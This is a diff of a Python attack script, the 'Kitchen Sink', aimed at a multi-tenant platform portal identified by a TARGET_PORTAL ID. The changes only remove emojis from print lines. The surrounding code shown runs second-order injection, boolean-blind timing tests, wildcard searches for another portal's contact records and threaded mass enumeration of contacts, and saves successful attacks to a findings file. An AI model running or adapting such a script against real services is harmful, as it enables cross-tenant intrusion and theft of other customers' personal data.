@@ -22,7 +22,7 @@ TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
 MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')
 
 print("="*80)
-print("🍲 KITCHEN SINK - Every Creative Attack")
+print(" KITCHEN SINK - Every Creative Attack")
 print("="*80)
 
 findings = []
@@ -49,7 +49,7 @@ def test_meetings_page_exploitation():
             print(f"  Found {len(api_urls)} API URLs in page")
 
             for api_url in list(set(api_urls))[:5]:
-                print(f"    → {api_url}")
+                print(f"     {api_url}")
 
                 # Try to access these APIs
                 try:
@@ -126,7 +126,7 @@ def test_second_order_attacks():
                 if r2.status_code == 200:
                     data = r2.json()
                     if TARGET_PORTAL in str(data):
-                        print(f"    🚨 Target portal ID found in response!")
+                        print(f"     Target portal ID found in response!")
                         findings.append({'attack': 'second_order', 'payload': payload, 'response': data})
         except:
             pass
@@ -232,7 +232,7 @@ def test_boolean_blind():
         print(f"  Difference: {abs(avg_true - avg_false):.3f}s")
 
         if abs(avg_true - avg_false) > 0.3:
-            print(f"    ⚠️ Significant timing difference!")
+            print(f"     Significant timing difference!")
             findings.append({
                 'attack': 'boolean_blind',
                 'true_avg': avg_true,
@@ -278,13 +278,13 @@ def test_wildcard_exploitation():
             if r.status_code == 200:
                 data = r.json()
                 if data.get('results'):
-                    print(f"    → Found {len(data['results'])} results!")
+                    print(f"     Found {len(data['results'])} results!")
                     # Check if any results are from target portal
                     for result in data['results']:
                         contact_id = int(result['id'])
                         # Target portal likely has lower contact IDs
                         if contact_id < 50000000000:
-                            print(f"      ⚠️ Low contact ID: {contact_id}")
+                            print(f"       Low contact ID: {contact_id}")
                             findings.append({
                                 'attack': 'wildcard_search',
                                 'pattern': pattern,
@@ -333,7 +333,7 @@ def test_mass_enumeration():
             result = future.result()
             if result:
                 successful.append(result)
-                print(f"    🚨 FOUND: Contact {result['id']}")
+                print(f"     FOUND: Contact {result['id']}")
                 findings.append({'attack': 'mass_enumeration', 'result': result})
 
     print(f"  Found {len(successful)} accessible contacts")
@@ -410,21 +410,21 @@ test_combination_attacks()
 # test_mass_enumeration()
 
 print("\n" + "="*80)
-print(f"✅ Kitchen Sink Attacks Complete!")
-print(f"📊 Findings: {len(findings)}")
+print(f" Kitchen Sink Attacks Complete!")
+print(f" Findings: {len(findings)}")
 print("="*80)
 
 if findings:
-    print("\n🎉 SUCCESSFUL ATTACKS:\n")
+    print("\n SUCCESSFUL ATTACKS:\n")
     for i, finding in enumerate(findings, 1):
         print(f"{i}. {finding.get('attack', 'Unknown')}")
         print(f"   {json.dumps(finding, indent=3)[:400]}...")
 
     with open('/home/user/Hub/findings/kitchen_sink_findings.json', 'w') as f:
         json.dump(findings, f, indent=2)
-    print(f"\n💾 Saved to: findings/kitchen_sink_findings.json")
+    print(f"\n Saved to: findings/kitchen_sink_findings.json")
 else:
-    print("\n❌ No successful attacks found.")
+    print("\n No successful attacks found.")
     print("\nAt this point, we've tested:")
     print("  • 100+ different attack vectors")
     print("  • Multiple encoding techniques")
